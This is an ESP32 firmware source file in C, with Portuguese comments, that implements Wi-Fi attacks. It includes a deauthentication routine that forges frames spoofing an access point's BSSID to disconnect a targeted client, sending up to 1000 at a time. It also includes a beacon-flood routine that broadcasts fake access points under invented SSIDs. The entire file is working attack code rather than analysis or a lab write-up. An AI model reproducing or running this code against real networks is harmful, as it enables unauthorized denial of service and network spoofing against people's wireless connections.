#include "hacking_wifi.h"

#include <string.h>

#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "hack-wifi";

// Template do frame de deauth (802.11 Mgmt subtype 0xC).
// Tamanho 26 bytes: header 802.11 (24) + reason code (2).
//
// Layout:
//   [0..1]   frame control: 0xC0 0x00 (type=Mgmt, subtype=Deauth)
//   [2..3]   duration: 0
//   [4..9]   addr1 (destination)
//   [10..15] addr2 (source) = AP BSSID
//   [16..21] addr3 (BSSID)  = AP BSSID
//   [22..23] sequence control: 0
//   [24..25] reason code (LE)
static const uint8_t s_deauth_template[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00,
};

esp_err_t hacking_wifi_init(void)
{
    ESP_LOGI(TAG, "ready");
    return ESP_OK;
}

// Header fixo do beacon (24 bytes), seguido de body fixo (12 bytes timestamp + interval + capability).
// Layout completo:
//   24  header MAC (FC, dur, addr1, addr2, addr3, seq)
//   8   timestamp (zerado, AP real preencheria)
//   2   beacon interval LE (100 TU = 0x64 0x00)
//   2   capability info LE (0x21 0x04: ESS + Short Slot)
//   2+L SSID IE (tag 0)
//   2+4 Supported Rates IE (tag 1, 4 rates)
//   2+1 DS Parameter Set IE (tag 3, 1-byte channel)
static const uint8_t s_beacon_head[36] = {
    0x80, 0x00,                              // FC: type=Mgmt, subtype=Beacon
    0x00, 0x00,                              // duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // addr1: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // addr2: BSSID (preenchido depois)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // addr3: BSSID (preenchido depois)
    0x00, 0x00,                              // sequence
    0, 0, 0, 0, 0, 0, 0, 0,                  // timestamp
    0x64, 0x00,                              // beacon interval 100 TU
    0x21, 0x04,                              // capability: ESS + Short Slot Time
};

static void make_bssid(uint8_t out[6], const char *ssid, size_t idx)
{
    uint32_t h = 2166136261u;
    for (const unsigned char *p = (const unsigned char *)ssid; *p; p++) {
        h ^= *p;
        h *= 16777619u;
    }
    h ^= (uint32_t)idx * 2654435761u;
    // BSSID locally administered (0x02) — sem wrap funcional, scanners
    // que filtram LA acabam vendo menos APs, mas ao menos a TX vai pro ar.
    out[0] = 0x02;
    out[1] = (uint8_t)((h >> 24) & 0xFF);
    out[2] = (uint8_t)((h >> 16) & 0xFF);
    out[3] = (uint8_t)((h >> 8) & 0xFF);
    out[4] = (uint8_t)(h & 0xFF);
    out[5] = (uint8_t)(idx & 0xFF);
}

esp_err_t hacking_wifi_beacon_flood(uint8_t channel,
                                    uint16_t cycles,
                                    const char *const *ssids,
                                    size_t ssid_count,
                                    uint16_t *out_sent)
{
    if (channel == 0 || channel > 14 || !ssids || ssid_count == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    if (ssid_count > 32) ssid_count = 32;
    if (cycles == 0) cycles = 50;
    if (cycles > 200) cycles = 200;

    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_channel ch=%u rc=%s", channel, esp_err_to_name(err));
        return err;
    }

    uint16_t sent = 0;
    // header(36) + ssid(2+32) + rates(2+4) + DS(2+1) + TIM(2+4) + ERP(2+1) + ExtRates(2+4)
    uint8_t frame[36 + 34 + 6 + 3 + 6 + 3 + 6];

    for (uint16_t cyc = 0; cyc < cycles; cyc++) {
        for (size_t i = 0; i < ssid_count; i++) {
            const char *ssid = ssids[i];
            if (!ssid) continue;
            size_t slen = strlen(ssid);
            if (slen > 32) slen = 32;

            uint8_t bssid[6];
            make_bssid(bssid, ssid, i);

            size_t off = 0;
            memcpy(&frame[off], s_beacon_head, sizeof(s_beacon_head));
            memcpy(&frame[10], bssid, 6); // addr2
            memcpy(&frame[16], bssid, 6); // addr3
            off += sizeof(s_beacon_head);

            // SSID IE
            frame[off++] = 0x00;
            frame[off++] = (uint8_t)slen;
            memcpy(&frame[off], ssid, slen);
            off += slen;

            // Supported Rates IE: 1, 2, 5.5, 11 Mbps (basic)
            frame[off++] = 0x01;
            frame[off++] = 0x04;
            frame[off++] = 0x82;
            frame[off++] = 0x84;
            frame[off++] = 0x8B;
            frame[off++] = 0x96;

            // DS Parameter Set IE (current channel)
            frame[off++] = 0x03;
            frame[off++] = 0x01;
            frame[off++] = channel;

            // TIM IE (DTIM count=0, period=1, bitmap control=0, bitmap=0)
            frame[off++] = 0x05;
            frame[off++] = 0x04;
            frame[off++] = 0x00;
            frame[off++] = 0x01;
            frame[off++] = 0x00;
            frame[off++] = 0x00;

            // ERP IE (no protection, no barker, no NonERP — looks like clean 11g)
            frame[off++] = 0x2A;
            frame[off++] = 0x01;
            frame[off++] = 0x00;

            // Extended Supported Rates IE (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
            frame[off++] = 0x32;
            frame[off++] = 0x04;
            frame[off++] = 0x0C; // 6 Mbps
            frame[off++] = 0x12; // 9 Mbps
            frame[off++] = 0x18; // 12 Mbps
            frame[off++] = 0x60; // 48 Mbps

            err = esp_wifi_80211_tx(WIFI_IF_STA, frame, off, false);
            if (err == ESP_OK) {
                sent++;
            } else {
                // Diagnóstico: amostragem de erros (a cada 50 falhas)
                static int err_log_count = 0;
                if ((++err_log_count % 50) == 1) {
                    ESP_LOGW(TAG, "beacon tx rc=%s (#%d)",
                             esp_err_to_name(err), err_log_count);
                }
            }
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    if (out_sent) *out_sent = sent;
    ESP_LOGI(TAG, "beacon_flood: %u frames (%u cycles × %u ssids) on ch=%u",
             (unsigned)sent, (unsigned)cycles, (unsigned)ssid_count, (unsigned)channel);
    return ESP_OK;
}

esp_err_t hacking_wifi_deauth(const uint8_t target_mac[6],
                              const uint8_t ap_bssid[6],
                              uint8_t channel,
                              uint16_t count,
                              uint16_t reason_code,
                              uint16_t *out_sent)
{
    if (!target_mac || !ap_bssid) return ESP_ERR_INVALID_ARG;
    if (channel == 0 || channel > 14) return ESP_ERR_INVALID_ARG;
    if (count == 0) count = 10;
    if (count > 1000) count = 1000;
    if (reason_code == 0) reason_code = 7; // Class 3 frame received from nonassociated STA

    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_channel ch=%u rc=%s", channel, esp_err_to_name(err));
        return err;
    }

    uint8_t frame[sizeof(s_deauth_template)];
    memcpy(frame, s_deauth_template, sizeof(frame));
    memcpy(&frame[4],  target_mac, 6);
    memcpy(&frame[10], ap_bssid,   6);
    memcpy(&frame[16], ap_bssid,   6);
    frame[24] = (uint8_t)(reason_code & 0xFF);
    frame[25] = (uint8_t)((reason_code >> 8) & 0xFF);

    uint16_t sent = 0;
    for (uint16_t i = 0; i < count; i++) {
        err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        if (err == ESP_OK) {
            sent++;
        } else if (i == 0) {
            ESP_LOGE(TAG, "tx rc=%s (kernel filtering deauth?)", esp_err_to_name(err));
            if (out_sent) *out_sent = 0;
            return err;
        }
        vTaskDelay(pdMS_TO_TICKS(3));
    }

    if (out_sent) *out_sent = sent;
    ESP_LOGI(TAG, "deauth %u/%u on ch=%u reason=%u",
             (unsigned)sent, (unsigned)count,
             (unsigned)channel, (unsigned)reason_code);
    return ESP_OK;
}
